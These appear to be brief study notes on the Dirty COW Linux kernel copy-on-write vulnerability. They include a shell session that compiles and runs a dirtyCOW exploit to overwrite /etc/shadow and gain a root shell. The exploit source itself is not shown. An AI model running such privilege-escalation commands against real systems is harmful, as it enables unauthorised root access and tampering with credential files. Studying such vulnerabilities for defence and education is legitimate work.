**Dirty Cow** is a Linux Kernel exploit
- Kernel exploits give superuser power to the hacker
It forces the Linux kernel to write arbitrary data to restricted system files
- This resulted from a vulnerability in copy-on-write (COW) function used in Linux for memory management

With Dirty COW, an attacker could overwrite a system file
- It could be used to basically control operation of the memory management
	- Following overwrite `/etc/shadow` file using the exploit for which superuser (su) privilege is needed

```shell
[user@localhost]$ gcc -lpthread dirtyCOW.c -o dirtyCOW
[user@localhost]$ ./dirtyCOW /etc/shadow "root:X:1:0:99999:1:::"
[user@localhost]$ su root
********
[user@localhost]# whoami
[user@localhost]# root
```
